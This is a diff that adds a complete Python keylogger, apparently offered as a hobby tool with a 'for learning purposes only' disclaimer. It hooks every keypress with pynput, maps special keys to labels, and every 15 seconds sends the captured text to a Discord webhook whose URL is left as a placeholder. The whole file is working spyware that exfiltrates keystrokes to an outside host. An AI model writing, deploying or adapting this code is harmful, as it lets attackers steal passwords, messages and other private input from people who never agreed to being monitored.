@@ -1,0 +1,104 @@
+#For learning purposes only, do not use unethically
+from dhooks import Webhook
+from threading import Timer
+from pynput import keyboard
+
+WEBHOOK_URL = "URL_HERE" #discord webhook url
+TIME_INTERVAL = 15
+SPECIAL_KEYS = {
+    keyboard.Key.space: "[Space]",
+    keyboard.Key.enter: "[Enter]",
+    keyboard.Key.backspace: "[Backspace]",
+    keyboard.Key.tab: "[Tab]",
+    keyboard.Key.esc: "[Esc]",
+    keyboard.Key.caps_lock: "[CapsLock]",
+    keyboard.Key.insert: "[Insert]",
+    keyboard.Key.home: "[Home]",
+    keyboard.Key.page_up: "[PageUp]",
+    keyboard.Key.delete: "[Delete]",
+    keyboard.Key.end: "[End]",
+    keyboard.Key.page_down: "[PageDown]",
+    keyboard.Key.ctrl: "[Ctrl]",
+    keyboard.Key.ctrl_l: "[CtrlLeft]",
+    keyboard.Key.ctrl_r: "[CtrlRight]",
+    keyboard.Key.shift: "[Shift]",
+    keyboard.Key.shift_l: "[ShiftLeft]",
+    keyboard.Key.shift_r: "[ShiftRight]",
+    keyboard.Key.alt: "[Alt]",
+    keyboard.Key.alt_gr: "[AltGr]",
+    keyboard.Key.alt_l: "[AltLeft]",
+    keyboard.Key.alt_r: "[AltRight]",
+    keyboard.Key.left: "[Left]",
+    keyboard.Key.right: "[Right]",
+    keyboard.Key.up: "[Up]",
+    keyboard.Key.down: "[Down]",
+    keyboard.Key.print_screen: "[PrintScreen]",
+    keyboard.Key.scroll_lock: "[ScrollLock]",
+    keyboard.Key.pause: "[Pause]",
+    keyboard.Key.f1: "[F1]",
+    keyboard.Key.f2: "[F2]",
+    keyboard.Key.f3: "[F3]",
+    keyboard.Key.f4: "[F4]",
+    keyboard.Key.f5: "[F5]",
+    keyboard.Key.f6: "[F6]",
+    keyboard.Key.f7: "[F7]",
+    keyboard.Key.f8: "[F8]",
+    keyboard.Key.f9: "[F9]",
+    keyboard.Key.f10: "[F10]",
+    keyboard.Key.f11: "[F11]",
+    keyboard.Key.f12: "[F12]",
+    keyboard.Key.f13: "[F13]",
+    keyboard.Key.f14: "[F14]",
+    keyboard.Key.f15: "[F15]",
+    keyboard.Key.f16: "[F16]",
+    keyboard.Key.f17: "[F17]",
+    keyboard.Key.f18: "[F18]",
+    keyboard.Key.f19: "[F19]",
+    keyboard.Key.f20: "[F20]",
+    keyboard.Key.f21: "[F21]",
+    keyboard.Key.f22: "[F22]",
+    keyboard.Key.f23: "[F23]",
+    keyboard.Key.f24: "[F24]",
+    keyboard.Key.media_volume_down: "[VolumeDown]",
+    keyboard.Key.media_volume_up: "[VolumeUP]",
+    keyboard.Key.media_volume_mute: "[VolumeMute]",
+    keyboard.Key.media_play_pause: "[MediaPlayPause]",
+    keyboard.Key.media_next: "[MediaNext]",
+    keyboard.Key.media_previous: "[MediaPrevius]",
+    keyboard.Key.delete: "[Delete]",
+    keyboard.Key.cmd: "[Windows]",
+    keyboard.Key.cmd_l: "[WindowsLeft]",
+    keyboard.Key.cmd_r: "[WindowsRight]",
+}
+
+TECLAS = []
+
+def enviar_teclas():
+    global TECLAS
+    if TECLAS:
+        texto_teclas = ' '.join(format_tecla(tecla) for tecla in TECLAS)
+        hook = Webhook(WEBHOOK_URL)
+        hook.send(texto_teclas)
+        TECLAS = []
+    Timer(TIME_INTERVAL, enviar_teclas).start()
+
+def capturar_teclas(key):
+    global TECLAS
+    if key in SPECIAL_KEYS:
+        TECLAS.append(SPECIAL_KEYS[key])
+    else:
+        TECLAS.append(key)
+
+def format_tecla(tecla):
+    if isinstance(tecla, keyboard.Key):
+        return str(tecla)
+    else:
+        return str(tecla).strip("'")
+
+# Iniciar el programa
+keyboard_listener = keyboard.Listener(on_press=capturar_teclas)
+keyboard_listener.start()
+
+Timer(TIME_INTERVAL, enviar_teclas).start()
+
+keyboard_listener.join()
